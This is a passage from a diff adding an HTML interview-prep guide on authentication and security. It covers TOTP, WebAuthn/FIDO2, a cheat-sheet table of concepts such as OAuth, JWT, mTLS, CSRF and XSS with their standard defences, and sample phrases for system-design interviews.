+<li>Codes change every 30 seconds</li>
+<li>No network call needed for verification -- just time synchronization</li>
+</ul>
+<p><strong>WebAuthn / FIDO2:</strong></p>
+<ul>
+<li>Passwordless authentication using public key cryptography</li>
+<li>Private key stays on the device (hardware security key or phone)</li>
+<li>Resistant to phishing because the credential is bound to the origin (domain)</li>
+<li>The strongest form of user authentication available today</li>
+</ul>
+<div class="tip">
+
+<p>In interviews, when discussing authentication, always mention MFA as a security enhancement. For high-value operations (password changes, payment confirmations), suggest step-up authentication -- requiring an additional factor even if the user is already logged in.</p>
+</div>
+
+
+<hr>
+<h2>Interview Cheat Sheet</h2>
+<table>
+<thead>
+<tr>
+<th>Concept</th>
+<th>One-Liner</th>
+<th>When to Mention</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>OAuth 2.0</td>
+<td>Authorization framework, not authentication</td>
+<td>Third-party API access, user login</td>
+</tr>
+<tr>
+<td>PKCE</td>
+<td>Protects authorization code from interception</td>
+<td>Mobile apps, SPAs</td>
+</tr>
+<tr>
+<td>OIDC</td>
+<td>Authentication layer on top of OAuth 2.0</td>
+<td>User identity, SSO</td>
+</tr>
+<tr>
+<td>JWT</td>
+<td>Signed token: header.payload.signature</td>
+<td>Token format discussion</td>
+</tr>
+<tr>
+<td>RS256 vs HS256</td>
+<td>Asymmetric (safe) vs symmetric (risky at scale)</td>
+<td>Token signing strategy</td>
+</tr>
+<tr>
+<td>Refresh token rotation</td>
+<td>New refresh token each use, detect theft</td>
+<td>Session management</td>
+</tr>
+<tr>
+<td>SSO</td>
+<td>Authenticate once, access many apps</td>
+<td>Enterprise, multi-app platform</td>
+</tr>
+<tr>
+<td>TLS handshake</td>
+<td>Asymmetric key exchange, then symmetric encryption</td>
+<td>Any &quot;how is data secured in transit&quot; question</td>
+</tr>
+<tr>
+<td>mTLS</td>
+<td>Both sides present certificates</td>
+<td>Service-to-service auth</td>
+</tr>
+<tr>
+<td>CORS</td>
+<td>Browser blocks cross-origin requests by default</td>
+<td>Web API security</td>
+</tr>
+<tr>
+<td>CSRF</td>
+<td>Attacker tricks browser into making authenticated requests</td>
+<td>Form-based actions</td>
+</tr>
+<tr>
+<td>SQL injection</td>
+<td>Parameterized queries prevent it</td>
+<td>Any database interaction</td>
+</tr>
+<tr>
+<td>XSS</td>
+<td>Encode output, use CSP</td>
+<td>Any user-generated content</td>
+</tr>
+<tr>
+<td>AES-256</td>
+<td>Standard symmetric encryption for data at rest</td>
+<td>Data storage security</td>
+</tr>
+<tr>
+<td>E2EE</td>
+<td>Server never sees plaintext</td>
+<td>Messaging systems</td>
+</tr>
+<tr>
+<td>Envelope encryption</td>
+<td>DEK encrypts data, KEK encrypts DEK</td>
+<td>Key management discussion</td>
+</tr>
+<tr>
+<td>bcrypt/Argon2</td>
+<td>Deliberately slow password hashing</td>
+<td>Password storage</td>
+</tr>
+<tr>
+<td>Least privilege</td>
+<td>Minimum permissions necessary</td>
+<td>Any access control discussion</td>
+</tr>
+<tr>
+<td>Zero trust</td>
+<td>Never trust, always verify</td>
+<td>Network architecture, microservices</td>
+</tr>
+</tbody></table>
+<p><strong>Key interview phrases:</strong></p>
+<ul>
+<li>&quot;We&#39;ll use OAuth 2.0 with PKCE for the authorization flow and OIDC for user authentication.&quot;</li>
+<li>&quot;Access tokens are short-lived JWTs signed with RS256. Refresh tokens are rotated on each use.&quot;</li>
+<li>&quot;All service-to-service communication uses mTLS, managed by the service mesh.&quot;</li>
+<li>&quot;We follow zero trust principles -- network location doesn&#39;t grant implicit access.&quot;</li>
+<li>&quot;Passwords are hashed with Argon2 and a unique salt. We never store or log plaintext passwords.&quot;</li>
+<li>&quot;We use envelope encryption: each record has its own DEK, encrypted by a KEK in our KMS.&quot;</li>
+</ul>
+
+</body>
+</html>
